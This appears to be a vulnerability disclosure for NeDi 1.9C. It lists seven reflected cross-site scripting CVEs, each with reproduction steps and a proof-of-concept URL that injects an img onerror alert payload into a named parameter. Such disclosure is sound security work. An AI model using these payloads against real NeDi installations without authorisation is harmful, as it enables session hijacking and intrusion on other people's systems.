# NeDi-1.9C-Multiple-CVEs

##Multiple Cross-Site Script Vulnerabilities found in NeDi 1.9C version.

**Description:-**
NeDi 1.9C is vulnerable to a cross-site scripting (XSS) attack.
The application allows an attacker to execute arbitrary JavaScript code via the "Topology-Map.php" page on "xo" parameter.

**Steps To Reproduce:-**
1. Login to the Application.
2. Go to ```"https://ip/Topology-Map.php"``` page.
3. Add 'xo' parameter at the end of the URL.
   Example:- ```https://ip/Topology-Map.php?xo=<img src=x onerror=alert(document.domain)>```

**Reference: CVE-2020-15028**


**Description:-**
NeDi 1.9C is vulnerable to a cross-site scripting (XSS) attack.
The application allows an attacker to execute arbitrary JavaScript code via the "Assets-Management.php" page on "sn" parameter.

**Steps To Reproduce:-**
1. Login to the Application.
2. Go to ```"https://ip/Assets-Management.php"``` page.
3. Add 'sn' parameter at the end of the URL.
   Example:- ```https://ip/Assets-Management.php?st=10&sn="><img src=x onerror=alert(document.domain)>&an=&ty=&cl=&lo=&co=&ps=&pc=&pn=&pt=&ew=&es=&el=&ms=0&mp=&sl=&md=&mc=&sm=&em=&com=&lst=&val=&add=Add```

**Reference: CVE-2020-15029**


**Description:-**
NeDi 1.9C is vulnerable to a cross-site scripting (XSS) attack.
The application allows an attacker to execute arbitrary JavaScript code via the "Topology-Routes.php" page on "rtr" parameter.

**Steps To Reproduce:-**
1. Login to the Application.
2. Go to ```"https://ip/Topology-Routes.php"``` page.
3. Add 'rtr' parameter at the end of the URL.
   Example:- ```https://ip/Topology-Routes.php?rtr=<img src=x onerror=alert(document.domain)>```

**Reference: CVE-2020-15030**


**Description:-**
NeDi 1.9C is vulnerable to a cross-site scripting (XSS) attack.
The application allows an attacker to execute arbitrary JavaScript code via the "Assets-Management.php" page on "chg" parameter.

**Steps To Reproduce:-**
1. Login to the Application.
2. Go to ```"https://ip/Assets-Management.php"``` page.
3. Add 'chg' parameter at the end of the URL.
   Example:- ```https://ip/Assets-Management.php?chg=<img src=a onerror=alert(document.domain)>```

**Reference: CVE-2020-15031**


**Description:-**
NeDi 1.9C is vulnerable to a cross-site scripting (XSS) attack.
The application allows an attacker to execute arbitrary JavaScript code via the "Monitoring-Incidents.php" page on "id" parameter.

**Steps To Reproduce:-**
1. Login to the Application.
2. Go to ```"https://ip/Monitoring-Incidents.php"``` page.
3. Add 'id' parameter at the end of the URL.
   Example:- ```https://ip/Monitoring-Incidents.php?id="><img src=x onerror=alert(document.domain)>```

**Reference: CVE-2020-15032**


**Description:-**
NeDi 1.9C is vulnerable to a cross-site scripting (XSS) attack.
The application allows an attacker to execute arbitrary JavaScript code via the "snmpget.php" page on "ip" parameter.

**Steps To Reproduce:-**
1. Login to the Application.
2. Go to ```"https://ip/snmpget.php"``` page.
3. Add 'ip' parameter at the end of the URL.
   Example:- ```https://ip/snmpget.php?ip="><img src=x onerror=alert(document.domain)>```

**Reference: CVE-2020-15033**


**Description:-**
NeDi 1.9C is vulnerable to a cross-site scripting (XSS) attack.
The application allows an attacker to execute arbitrary JavaScript code via the "Monitoring-Setup.php" page on "tet" parameter.

**Steps To Reproduce:-**
1. Login to the Application.
2. Go to ```"https://ip/Monitoring-Setup.php"``` page.
3. Add 'tet' parameter at the end of the URL.
   Example:- ```https://ip/Monitoring-Setup.php?tet=<img src=x onerror=alert(document.domain)>```

**Reference: CVE-2020-15034**
